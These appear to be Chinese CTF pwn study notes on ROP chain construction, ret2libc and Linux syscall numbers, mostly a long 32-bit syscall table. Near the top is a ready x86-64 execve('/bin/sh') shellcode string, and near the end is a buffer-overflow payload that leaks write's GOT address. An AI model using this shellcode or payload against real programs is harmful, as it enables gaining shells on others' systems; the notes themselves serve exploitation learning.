# note
## ROP构造思路
## ropchain
直接使用ROPgadget --binary bin --ropchain即可以得到rop链,填充返回地址既可。
shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" 

### ret2libc
条件:开启NX(堆栈不可执行),此时堆栈上的代码无法执行,但是我们可以在堆栈上构造通向指定执行ROP链。  
查看代码,存在明显的"/bin/sh"

## 系统调用函数
有关系统调用的一篇ROP链构造的[博文](https://blog.csdn.net/kevin66654/article/details/86766875)
syscall函数:
syscall(int arg1, ……),为可变参数的函数,第一个参数为系统调用号
查询系统调用号方式:

```bash
cat -n /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep "__NR_"
```
结果如下:
```c
	 4  #define __NR_restart_syscall 0
     5	#define __NR_exit 1
     6	#define __NR_fork 2
     7	#define __NR_read 3
     8	#define __NR_write 4
     9	#define __NR_open 5
    10	#define __NR_close 6
    11	#define __NR_waitpid 7
    12	#define __NR_creat 8
    13	#define __NR_link 9
    14	#define __NR_unlink 10
    15	#define __NR_execve 11
    16	#define __NR_chdir 12
    17	#define __NR_time 13
    18	#define __NR_mknod 14
    19	#define __NR_chmod 15
    20	#define __NR_lchown 16
    21	#define __NR_break 17
    22	#define __NR_oldstat 18
    23	#define __NR_lseek 19
    24	#define __NR_getpid 20
    25	#define __NR_mount 21
    26	#define __NR_umount 22
    27	#define __NR_setuid 23
    28	#define __NR_getuid 24
    29	#define __NR_stime 25
    30	#define __NR_ptrace 26
    31	#define __NR_alarm 27
    32	#define __NR_oldfstat 28
    33	#define __NR_pause 29
    34	#define __NR_utime 30
    35	#define __NR_stty 31
    36	#define __NR_gtty 32
    37	#define __NR_access 33
    38	#define __NR_nice 34
    39	#define __NR_ftime 35
    40	#define __NR_sync 36
    41	#define __NR_kill 37
    42	#define __NR_rename 38
    43	#define __NR_mkdir 39
    44	#define __NR_rmdir 40
    45	#define __NR_dup 41
    46	#define __NR_pipe 42
    47	#define __NR_times 43
    48	#define __NR_prof 44
    49	#define __NR_brk 45
    50	#define __NR_setgid 46
    51	#define __NR_getgid 47
    52	#define __NR_signal 48
    53	#define __NR_geteuid 49
    54	#define __NR_getegid 50
    55	#define __NR_acct 51
    56	#define __NR_umount2 52
    57	#define __NR_lock 53
    58	#define __NR_ioctl 54
    59	#define __NR_fcntl 55
    60	#define __NR_mpx 56
    61	#define __NR_setpgid 57
    62	#define __NR_ulimit 58
    63	#define __NR_oldolduname 59
    64	#define __NR_umask 60
    65	#define __NR_chroot 61
    66	#define __NR_ustat 62
    67	#define __NR_dup2 63
    68	#define __NR_getppid 64
    69	#define __NR_getpgrp 65
    70	#define __NR_setsid 66
    71	#define __NR_sigaction 67
    72	#define __NR_sgetmask 68
    73	#define __NR_ssetmask 69
    74	#define __NR_setreuid 70
    75	#define __NR_setregid 71
    76	#define __NR_sigsuspend 72
    77	#define __NR_sigpending 73
    78	#define __NR_sethostname 74
    79	#define __NR_setrlimit 75
    80	#define __NR_getrlimit 76
    81	#define __NR_getrusage 77
    82	#define __NR_gettimeofday 78
    83	#define __NR_settimeofday 79
    84	#define __NR_getgroups 80
    85	#define __NR_setgroups 81
    86	#define __NR_select 82
    87	#define __NR_symlink 83
    88	#define __NR_oldlstat 84
    89	#define __NR_readlink 85
    90	#define __NR_uselib 86
    91	#define __NR_swapon 87
    92	#define __NR_reboot 88
    93	#define __NR_readdir 89
    94	#define __NR_mmap 90
    95	#define __NR_munmap 91
    96	#define __NR_truncate 92
    97	#define __NR_ftruncate 93
    98	#define __NR_fchmod 94
    99	#define __NR_fchown 95
   100	#define __NR_getpriority 96
   101	#define __NR_setpriority 97
   102	#define __NR_profil 98
   103	#define __NR_statfs 99
   104	#define __NR_fstatfs 100
   105	#define __NR_ioperm 101
   106	#define __NR_socketcall 102
   107	#define __NR_syslog 103
   108	#define __NR_setitimer 104
   109	#define __NR_getitimer 105
   110	#define __NR_stat 106
   111	#define __NR_lstat 107
   112	#define __NR_fstat 108
   113	#define __NR_olduname 109
   114	#define __NR_iopl 110
   115	#define __NR_vhangup 111
   116	#define __NR_idle 112
   117	#define __NR_vm86old 113
   118	#define __NR_wait4 114
   119	#define __NR_swapoff 115
   120	#define __NR_sysinfo 116
   121	#define __NR_ipc 117
   122	#define __NR_fsync 118
   123	#define __NR_sigreturn 119
   124	#define __NR_clone 120
   125	#define __NR_setdomainname 121
   126	#define __NR_uname 122
   127	#define __NR_modify_ldt 123
   128	#define __NR_adjtimex 124
   129	#define __NR_mprotect 125
   130	#define __NR_sigprocmask 126
   131	#define __NR_create_module 127
   132	#define __NR_init_module 128
   133	#define __NR_delete_module 129
   134	#define __NR_get_kernel_syms 130
   135	#define __NR_quotactl 131
   136	#define __NR_getpgid 132
   137	#define __NR_fchdir 133
   138	#define __NR_bdflush 134
   139	#define __NR_sysfs 135
   140	#define __NR_personality 136
   141	#define __NR_afs_syscall 137
   142	#define __NR_setfsuid 138
   143	#define __NR_setfsgid 139
   144	#define __NR__llseek 140
   145	#define __NR_getdents 141
   146	#define __NR__newselect 142
   147	#define __NR_flock 143
   148	#define __NR_msync 144
   149	#define __NR_readv 145
   150	#define __NR_writev 146
   151	#define __NR_getsid 147
   152	#define __NR_fdatasync 148
   153	#define __NR__sysctl 149
   154	#define __NR_mlock 150
   155	#define __NR_munlock 151
   156	#define __NR_mlockall 152
   157	#define __NR_munlockall 153
   158	#define __NR_sched_setparam 154
   159	#define __NR_sched_getparam 155
   160	#define __NR_sched_setscheduler 156
   161	#define __NR_sched_getscheduler 157
   162	#define __NR_sched_yield 158
   163	#define __NR_sched_get_priority_max 159
   164	#define __NR_sched_get_priority_min 160
   165	#define __NR_sched_rr_get_interval 161
   166	#define __NR_nanosleep 162
   167	#define __NR_mremap 163
   168	#define __NR_setresuid 164
   169	#define __NR_getresuid 165
   170	#define __NR_vm86 166
   171	#define __NR_query_module 167
   172	#define __NR_poll 168
   173	#define __NR_nfsservctl 169
   174	#define __NR_setresgid 170
   175	#define __NR_getresgid 171
   176	#define __NR_prctl 172
   177	#define __NR_rt_sigreturn 173
   178	#define __NR_rt_sigaction 174
   179	#define __NR_rt_sigprocmask 175
   180	#define __NR_rt_sigpending 176
   181	#define __NR_rt_sigtimedwait 177
   182	#define __NR_rt_sigqueueinfo 178
   183	#define __NR_rt_sigsuspend 179
   184	#define __NR_pread64 180
   185	#define __NR_pwrite64 181
   186	#define __NR_chown 182
   187	#define __NR_getcwd 183
   188	#define __NR_capget 184
   189	#define __NR_capset 185
   190	#define __NR_sigaltstack 186
   191	#define __NR_sendfile 187
   192	#define __NR_getpmsg 188
   193	#define __NR_putpmsg 189
   194	#define __NR_vfork 190
   195	#define __NR_ugetrlimit 191
   196	#define __NR_mmap2 192
   197	#define __NR_truncate64 193
   198	#define __NR_ftruncate64 194
   199	#define __NR_stat64 195
   200	#define __NR_lstat64 196
   201	#define __NR_fstat64 197
   202	#define __NR_lchown32 198
   203	#define __NR_getuid32 199
   204	#define __NR_getgid32 200
   205	#define __NR_geteuid32 201
   206	#define __NR_getegid32 202
   207	#define __NR_setreuid32 203
   208	#define __NR_setregid32 204
   209	#define __NR_getgroups32 205
   210	#define __NR_setgroups32 206
   211	#define __NR_fchown32 207
   212	#define __NR_setresuid32 208
   213	#define __NR_getresuid32 209
   214	#define __NR_setresgid32 210
   215	#define __NR_getresgid32 211
   216	#define __NR_chown32 212
   217	#define __NR_setuid32 213
   218	#define __NR_setgid32 214
   219	#define __NR_setfsuid32 215
   220	#define __NR_setfsgid32 216
   221	#define __NR_pivot_root 217
   222	#define __NR_mincore 218
   223	#define __NR_madvise 219
   224	#define __NR_getdents64 220
   225	#define __NR_fcntl64 221
   226	#define __NR_gettid 224
   227	#define __NR_readahead 225
   228	#define __NR_setxattr 226
   229	#define __NR_lsetxattr 227
   230	#define __NR_fsetxattr 228
   231	#define __NR_getxattr 229
   232	#define __NR_lgetxattr 230
   233	#define __NR_fgetxattr 231
   234	#define __NR_listxattr 232
   235	#define __NR_llistxattr 233
   236	#define __NR_flistxattr 234
   237	#define __NR_removexattr 235
   238	#define __NR_lremovexattr 236
   239	#define __NR_fremovexattr 237
   240	#define __NR_tkill 238
   241	#define __NR_sendfile64 239
   242	#define __NR_futex 240
   243	#define __NR_sched_setaffinity 241
   244	#define __NR_sched_getaffinity 242
   245	#define __NR_set_thread_area 243
   246	#define __NR_get_thread_area 244
   247	#define __NR_io_setup 245
   248	#define __NR_io_destroy 246
   249	#define __NR_io_getevents 247
   250	#define __NR_io_submit 248
   251	#define __NR_io_cancel 249
   252	#define __NR_fadvise64 250
   253	#define __NR_exit_group 252
   254	#define __NR_lookup_dcookie 253
   255	#define __NR_epoll_create 254
   256	#define __NR_epoll_ctl 255
   257	#define __NR_epoll_wait 256
   258	#define __NR_remap_file_pages 257
   259	#define __NR_set_tid_address 258
   260	#define __NR_timer_create 259
   261	#define __NR_timer_settime 260
   262	#define __NR_timer_gettime 261
   263	#define __NR_timer_getoverrun 262
   264	#define __NR_timer_delete 263
   265	#define __NR_clock_settime 264
   266	#define __NR_clock_gettime 265
   267	#define __NR_clock_getres 266
   268	#define __NR_clock_nanosleep 267
   269	#define __NR_statfs64 268
   270	#define __NR_fstatfs64 269
   271	#define __NR_tgkill 270
   272	#define __NR_utimes 271
   273	#define __NR_fadvise64_64 272
   274	#define __NR_vserver 273
   275	#define __NR_mbind 274
   276	#define __NR_get_mempolicy 275
   277	#define __NR_set_mempolicy 276
   278	#define __NR_mq_open 277
   279	#define __NR_mq_unlink 278
   280	#define __NR_mq_timedsend 279
   281	#define __NR_mq_timedreceive 280
   282	#define __NR_mq_notify 281
   283	#define __NR_mq_getsetattr 282
   284	#define __NR_kexec_load 283
   285	#define __NR_waitid 284
   286	#define __NR_add_key 286
   287	#define __NR_request_key 287
   288	#define __NR_keyctl 288
   289	#define __NR_ioprio_set 289
   290	#define __NR_ioprio_get 290
   291	#define __NR_inotify_init 291
   292	#define __NR_inotify_add_watch 292
   293	#define __NR_inotify_rm_watch 293
   294	#define __NR_migrate_pages 294
   295	#define __NR_openat 295
   296	#define __NR_mkdirat 296
   297	#define __NR_mknodat 297
   298	#define __NR_fchownat 298
   299	#define __NR_futimesat 299
   300	#define __NR_fstatat64 300
   301	#define __NR_unlinkat 301
   302	#define __NR_renameat 302
   303	#define __NR_linkat 303
   304	#define __NR_symlinkat 304
   305	#define __NR_readlinkat 305
   306	#define __NR_fchmodat 306
   307	#define __NR_faccessat 307
   308	#define __NR_pselect6 308
   309	#define __NR_ppoll 309
   310	#define __NR_unshare 310
   311	#define __NR_set_robust_list 311
   312	#define __NR_get_robust_list 312
   313	#define __NR_splice 313
   314	#define __NR_sync_file_range 314
   315	#define __NR_tee 315
   316	#define __NR_vmsplice 316
   317	#define __NR_move_pages 317
   318	#define __NR_getcpu 318
   319	#define __NR_epoll_pwait 319
   320	#define __NR_utimensat 320
   321	#define __NR_signalfd 321
   322	#define __NR_timerfd_create 322
   323	#define __NR_eventfd 323
   324	#define __NR_fallocate 324
   325	#define __NR_timerfd_settime 325
   326	#define __NR_timerfd_gettime 326
   327	#define __NR_signalfd4 327
   328	#define __NR_eventfd2 328
   329	#define __NR_epoll_create1 329
   330	#define __NR_dup3 330
   331	#define __NR_pipe2 331
   332	#define __NR_inotify_init1 332
   333	#define __NR_preadv 333
   334	#define __NR_pwritev 334
   335	#define __NR_rt_tgsigqueueinfo 335
   336	#define __NR_perf_event_open 336
   337	#define __NR_recvmmsg 337
   338	#define __NR_fanotify_init 338
   339	#define __NR_fanotify_mark 339
   340	#define __NR_prlimit64 340
   341	#define __NR_name_to_handle_at 341
   342	#define __NR_open_by_handle_at 342
   343	#define __NR_clock_adjtime 343
   344	#define __NR_syncfs 344
   345	#define __NR_sendmmsg 345
   346	#define __NR_setns 346
   347	#define __NR_process_vm_readv 347
   348	#define __NR_process_vm_writev 348
   349	#define __NR_kcmp 349
   350	#define __NR_finit_module 350
   351	#define __NR_sched_setattr 351
   352	#define __NR_sched_getattr 352
   353	#define __NR_renameat2 353
   354	#define __NR_seccomp 354
   355	#define __NR_getrandom 355
   356	#define __NR_memfd_create 356
   357	#define __NR_bpf 357
   358	#define __NR_execveat 358
   359	#define __NR_socket 359
   360	#define __NR_socketpair 360
   361	#define __NR_bind 361
   362	#define __NR_connect 362
   363	#define __NR_listen 363
   364	#define __NR_accept4 364
   365	#define __NR_getsockopt 365
   366	#define __NR_setsockopt 366
   367	#define __NR_getsockname 367
   368	#define __NR_getpeername 368
   369	#define __NR_sendto 369
   370	#define __NR_sendmsg 370
   371	#define __NR_recvfrom 371
   372	#define __NR_recvmsg 372
   373	#define __NR_shutdown 373
   374	#define __NR_userfaultfd 374
   375	#define __NR_membarrier 375
   376	#define __NR_mlock2 376
   377	#define __NR_copy_file_range 377
   378	#define __NR_preadv2 378
   379	#define __NR_pwritev2 379
   380	#define __NR_pkey_mprotect 380
   381	#define __NR_pkey_alloc 381
   382	#define __NR_pkey_free 382
   383	#define __NR_statx 383
   384	#define __NR_arch_prctl 384
   385	#define __NR_io_pgetevents 385
   386	#define __NR_rseq 386
```
拿__NR_read 3举例,表示ID = 3时,调用的是read函数  
```c
SYSCALL_DEFINE3(read, unsigned int fd, char* buf, size_t count)
```
fd为系统描述符,fd=0时表示标准输入,从键盘输入读取,buf为缓冲区,count为长度
拿__NR_write 4举例,表示ID = 4时,调用的是write函数（和read类似）

```c
_syscall3(int write,int fd,const char * buf,off_t count)
```
我们看到,execve函数的ID为11,当执行execve(“/bin//sh”,NULL,NULL)即成功。

```
some tips:
syscall(4, 1, &v4, 42)即相当于write(1, &v4, 42)，syscall(3, 0, &v1, 1024)即相当于read(0, &v1, 1024)
yscall(11, "/bin/sh", 0, 0)就相当于执行了execve("/bin/sh", 0, 0)
```

## 无system以及/bin/sh之类的字符时

可以首先泄露某个函数得地址，进而通过偏移找出函数的库，通过然后找出其他函数的真正加载地址，包括system函数也包括/bin/sh字符串。

比如"write"函数得利用:

> 返回到write函数执行`write(1,write_got,4)`得到write的真实地址:
>
> payload='a'*140+p32(write_plt)+p32(vulnerable_function)+p32(1)+p32(write_got)+p32(4)

得到实际地址以后使用libcsearcher就可以了

这里找libc版本要用io=remote来找，不然会错误，，，